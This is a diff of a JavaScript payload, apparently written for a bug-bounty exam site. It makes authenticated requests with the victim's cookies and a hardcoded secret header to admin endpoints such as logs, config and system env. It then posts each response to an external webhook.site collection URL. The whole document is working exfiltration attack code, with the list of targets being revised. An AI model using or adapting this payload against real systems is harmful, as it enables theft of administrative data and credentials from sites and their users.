@@ -4,27 +4,27 @@
     <script>
         const webh = "https://webhook.site/6b0b4772-6bdc-417e-a83a-2403f5690ef1";
         const base = "https://api-bugbounty-exam.hashacademy.co";
-        const msgId = "69ea4654bee6d6b7c66459ca";
 
-        // We try different variations of API paths to avoid 404s
+        // These are the "High Value" targets discovered in previous research
         const targets = [
             "/api/v1/admin/logs",
-            "/api/v1/admin/stats",
-            "/api/admin/dashboard",
-            `/api/v1/contact/messages/${msgId}`,
-            "/api/auth/profile" // To confirm the session is still active
+            "/api/admin/config",
+            "/api/admin/stats",
+            "/api/system/health",
+            "/api/logs/debug",
+            "/api/admin/system/env"
         ];
 
         targets.forEach(path => {
             fetch(base + path, { 
                 credentials: "include",
-                headers: { 'X-Platform-Secret': 'rNt4C4r_c4ch3_s3cr3t_2026' } 
+                headers: { 'X-Platform-Secret': 'rNt4C4r_c4ch3_s3cr3t_2026' }
             })
             .then(r => r.text())
             .then(data => {
                 fetch(webh, {
                     method: "POST",
-                    body: JSON.stringify({ path: path, data: data })
+                    body: JSON.stringify({ path: path, content: data })
                 });
             }).catch(e => {});
         });
